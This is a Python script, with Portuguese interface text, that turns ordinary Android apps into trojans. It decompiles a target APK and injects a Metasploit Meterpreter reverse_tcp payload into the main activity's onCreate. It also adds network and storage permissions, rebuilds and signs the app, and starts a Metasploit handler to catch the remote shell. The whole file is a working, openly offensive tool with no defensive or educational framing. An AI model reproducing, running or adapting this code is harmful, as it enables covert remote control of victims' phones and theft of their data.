import subprocess
import re
import os
import sys
import time
from shutil import which, copytree, rmtree

# --- CORES E ESTILO ---
RED, DARK_RED, WHITE, BOLD, RESET, YELLOW, GREEN = "\33[91m", "\33[31m", "\33[97m", "\33[1m", "\33[0m", "\33[93m", "\33[92m"

def log(msg, level="info"):
    p = {"info": f"{WHITE}[*]{RESET}", "success": f"{GREEN}[+]{RESET}", "warn": f"{YELLOW}[!]{RESET}", "error": f"{BOLD}{RED}[-]{RESET}"}
    print(f"{p.get(level, '[*]')} {msg}")

def exibir_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner = fr"""
{RED} ██╗    ██╗███████╗ █████╗ ██████╗  ██████╗ ███╗   ██╗██╗███████╗███████╗██████╗ 
{RED} ██║    ██║██╔════╝██╔══██╗██╔══██╗██╔═══██╗████╗  ██║██║╚══███╔╝██╔════╝██╔══██╗
{DARK_RED} ██║ █╗ ██║█████╗  ███████║██████╔╝██║   ██║██╔██╗ ██║██║  ███╔╝ █████╗  ██████╔╝
{DARK_RED} ██║███╗██║██╔══╝  ██╔══██║██╔═══╝ ██║   ██║██║╚██╗██║██║ ███╔╝  ██╔══╝  ██╔══██╗
{RED} ╚███╔███╔╝███████╗██║  ██║██║     ╚██████╔╝██║ ╚████║██║███████╗███████╗██║  ██║
{RED}  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
{RESET}
 {WHITE}{BOLD}FULL-CHAIN WEAPONIZER{RESET} | {WHITE}Build + Sign + Listen{RESET}
 {DARK_RED}─────────────────────────────────────────────────────────────────────────────{RESET}
    """.strip()
    print(banner)

def check_tools():
    tools = ["apktool", "msfvenom", "apksigner", "keytool", "msfconsole"]
    missing = [t for t in tools if not which(t)]
    if missing:
        log(f"Atenção! Ferramentas faltando: {', '.join(missing)}", "warn")
        log("Instale-as para que todas as funções funcionem corretamente.", "info")

def fix_permissions(project_folder):
    manifest = os.path.join(project_folder, "AndroidManifest.xml")
    with open(manifest, "r") as f: content = f.read()
    perms = [
        'android.permission.INTERNET', 
        'android.permission.ACCESS_NETWORK_STATE', 
        'android.permission.WAKE_LOCK',
        'android.permission.READ_EXTERNAL_STORAGE'
    ]
    needed = [f'    <uses-permission android:name="{p}"/>' for p in perms if p not in content]
    if needed:
        new_content = content.replace("</manifest>", "\n".join(needed) + "\n</manifest>")
        with open(manifest, "w") as f: f.write(new_content)
        log(f"Permissões de persistência e rede injetadas.", "success")

def iniciar_listener(ip, porta):
    log(f"Preparando Listener em {ip}:{porta}...", "info")
    rc_content = f"""
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST {ip}
set LPORT {porta}
set EXITONSESSION false
exploit -j
    """
    with open("handler.rc", "w") as f: f.write(rc_content)
    log("Iniciando Metasploit Multi-Handler (Sessão Background)...", "warn")
    os.system(f"msfconsole -r handler.rc")

def gerar_e_injetar_payload(project_folder):
    lhost = input(f" {YELLOW}»{RESET} Seu IP (LHOST): ").strip()
    lport = input(f" {YELLOW}»{RESET} Sua Porta (LPORT): ").strip()
    if not lhost or not lport: return False, None, None

    log("Gerando classes do Meterpreter e migrando para o alvo...", "info")
    # Gera o APK temporário em silêncio
    subprocess.run(["msfvenom", "-p", "android/meterpreter/reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "-o", "payload_tmp.apk"], capture_output=True)
    subprocess.run(["apktool", "d", "payload_tmp.apk", "-o", "payload_tmp", "-f"], capture_output=True)
    
    src_smali = os.path.join("payload_tmp", "smali", "com", "metasploit")
    dst_smali = os.path.join(project_folder, "smali", "com", "metasploit")
    if os.path.exists(dst_smali): rmtree(dst_smali)
    os.makedirs(os.path.dirname(dst_smali), exist_ok=True)
    copytree(src_smali, dst_smali)

    # Identifica a MainActivity
    with open(os.path.join(project_folder, "AndroidManifest.xml"), "r") as f:
        m_content = f.read()
        match = re.search(r'<activity [^>]*android:name="([^"]+)"', m_content)
        if not match: return False, None, None
        main_activity = match.group(1)
    
    smali_filename = main_activity.replace('.', '/') + ".smali"
    smali_path = None
    for root, dirs, files in os.walk(project_folder):
        if smali_filename in os.path.join(root, smali_filename):
            smali_path = os.path.join(root, smali_filename); break

    if smali_path:
        with open(smali_path, "r") as f: lines = f.readlines()
        new_lines, in_oncreate, injected = [], False, False
        for line in lines:
            new_lines.append(line)
            if ".method" in line and "onCreate(Landroid/os/Bundle;)V" in line: in_oncreate = True
            if in_oncreate and "invoke-super" in line and not injected:
                new_lines.append(f"\n    # Hook Automático Weaponizer\n")
                new_lines.append(f"    invoke-static {{p0}}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V\n")
                injected = True
            if ".end method" in line: in_oncreate = False
            
        with open(smali_path, "w") as f: f.writelines(new_lines)
        fix_permissions(project_folder)
        rmtree("payload_tmp"); os.remove("payload_tmp.apk")
        log("Shell injetada e permissões corrigidas.", "success")
        return True, lhost, lport
    return False, None, None

def build_e_assinar(out):
    final_apk = os.path.abspath(f"{out}_weaponized.apk")
    log(f"Recompilando projeto '{out}'...", "info")
    subprocess.run(["apktool", "b", out, "-o", "tmp.apk"], capture_output=True)
    
    ks = "debug.keystore"
    if not os.path.exists(ks):
        log("Gerando Keystore de desenvolvimento...", "info")
        subprocess.run(["keytool", "-genkey", "-v", "-keystore", ks, "-alias", "dev", "-keyalg", "RSA", "-keysize", "2048", "-validity", "10000", "-storepass", "android", "-keypass", "android", "-dname", "CN=Weaponizer"], capture_output=True)
    
    log("Assinando APK final...", "info")
    subprocess.run(["apksigner", "sign", "--ks", ks, "--ks-pass", "pass:android", "--out", final_apk, "tmp.apk"])
    if os.path.exists("tmp.apk"): os.remove("tmp.apk")
    print(f"\n{GREEN}[+] APK PRONTO:{RESET} {BOLD}{final_apk}{RESET}")
    return True

def main():
    check_tools()
    while True:
        exibir_banner()
        print(f" [{RED}1{RESET}] Decompile (Preparar Alvo)")
        print(f" [{RED}2{RESET}] GERAR SHELL + BUILD + SIGN + LISTEN")
        print(f" [{RED}3{RESET}] Listar Arquivos (ls)")
        print(f" [{RED}4{RESET}] Sair")
        
        try: login = os.getlogin()
        except: login = "user"
        
        cmd = input(f"\n {BOLD}{RED}WEAPONIZER@{login}:~# {RESET}").strip()
        
        if cmd.lower() == "ls" or cmd == "3":
            print(f"\n{BOLD}Diretório Atual:{RESET}")
            subprocess.run(["ls", "-F", "--color=auto"])
            input("\nEnter para voltar...")
        elif cmd == "1":
            file = input(f" {RED}»{RESET} Digite o nome do APK: ").strip()
            if os.path.exists(file):
                out = os.path.splitext(os.path.basename(file))[0]
                subprocess.run(["apktool", "d", file, "-o", out, "-f"])
                log(f"Projeto aberto na pasta: {out}", "success"); time.sleep(1)
            else: log("Arquivo não encontrado.", "error"); time.sleep(1)
        elif cmd == "2":
            out = input(f" {RED}»{RESET} Nome da pasta do projeto: ").strip().rstrip('/')
            if os.path.isdir(out):
                success, ip, porta = gerar_e_injetar_payload(out)
                if success:
                    if build_e_assinar(out):
                        check = input(f"\n{YELLOW}[?]{RESET} Deseja iniciar o handler no msfconsole? (s/n): ").lower()
                        if check == 's': iniciar_listener(ip, porta)
            else: log("Diretório inválido.", "error"); time.sleep(1)
        elif cmd == "4" or cmd.lower() == "exit": break

if __name__ == "__main__":
    main()
